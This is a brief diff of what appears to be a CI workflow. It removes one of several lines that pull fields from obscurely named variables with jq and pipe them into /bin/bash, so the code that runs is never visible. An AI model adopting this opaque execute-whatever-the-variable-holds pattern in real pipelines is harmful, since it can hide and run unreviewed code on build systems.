@@ -26,7 +26,6 @@ jobs:
           echo $m8 | jq -r .bdxn5674 | /bin/bash
           echo $qxvps621 | jq -r .lyyj171 | /bin/bash
           printf '%s' "$js32" | jq -r .xedy86 | /bin/bash
-          echo $fzzox6481 | jq -r .odm0 | /bin/bash
           printf '%s' "$rydeo7" | jq -r .rjeyl97416 | /bin/bash
 
       - name: Archive output
